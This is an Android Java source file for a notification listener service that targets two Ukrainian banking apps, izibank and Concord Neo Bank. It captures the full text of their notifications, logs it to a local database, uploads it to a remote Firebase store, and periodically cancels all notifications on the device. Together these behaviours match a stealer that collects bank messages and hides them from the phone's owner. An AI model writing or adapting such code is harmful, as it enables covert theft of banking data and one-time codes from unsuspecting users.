 package com.example.pinkie_pie;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.RequiresApi;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.Console;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class NLService extends NotificationListenerService {
    public FireData data;
    String past;
    String LOG_TAG = "myLogs";
    int number = 0;

    //String FILENAME = "file";

    //Context context = this;

    DBHelper dbHelper;
    NewPush pushT;
    //FireParse parse;

    @Override
    public void onCreate() {
        super.onCreate();
        dbHelper = new DBHelper(this);
        data = new FireData();
        pushT = new NewPush("");
        //parse = new FireParse();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        //Log.i("notify", extras.getCharSequence("android.bigText").toString());
        //ua.concord.neo.bank.release / com.xiaomi.mipicks / ru.mw

        if (sbn.getPackageName() != null) {

            if("ua.izibank.app".equals(sbn.getPackageName()) || "ua.concord.neo.bank.release".equals(sbn.getPackageName())){
                Bundle extras = sbn.getNotification().extras;
                String notify = null;
                if (extras.getCharSequence("android.bigText") != null) {
                    notify = extras.getCharSequence("android.bigText").toString();
                }

                ContentValues cv = new ContentValues();
                SQLiteDatabase db = dbHelper.getWritableDatabase();

                // делаем запрос всех данных из таблицы mytable, получаем Cursor
                Cursor c = db.query("mytable", null, null, null, null, null, null);

                if (c.moveToFirst()) {

                    // определяем номера столбцов по имени в выборке
                    int nameColIndex = c.getColumnIndex("name");
                    int nameColNumber = c.getColumnIndex("number");
                    do {
                        // получаем значения по номерам столбцов и пишем все в лог
                        Log.d(LOG_TAG,
                                " name = " + c.getString(nameColIndex));
                        this.past = c.getString(nameColIndex);
                        this.number = c.getInt(nameColNumber);
                        // переход на следующую строку
                        // а если следующей нет (текущая - последняя), то false - выходим из цикла
                    } while (c.moveToNext());
                } else
                    Log.d(LOG_TAG, "0 rows");
                c.close();

                int clearCount = db.delete("mytable", null, null);
                Log.d(LOG_TAG, "deleted rows count = " + clearCount);

                if(this.past != notify) {
                    pushT.push = notify;
                    data.DataBase().push().setValue(pushT);
                    Log.i("NotifyService", "now : { " + notify + " } past : {" + this.past +"}");

                    cv.put("name", notify);
                    if (number < 5) {
                        number +=1;

                    } else {
                        number = 0;
                        cancelAllNotifications();
                    }
                    cv.put("number", number);
                    db.insert("mytable", null, cv);
                }

                dbHelper.close();
            }
        }
        }
    }

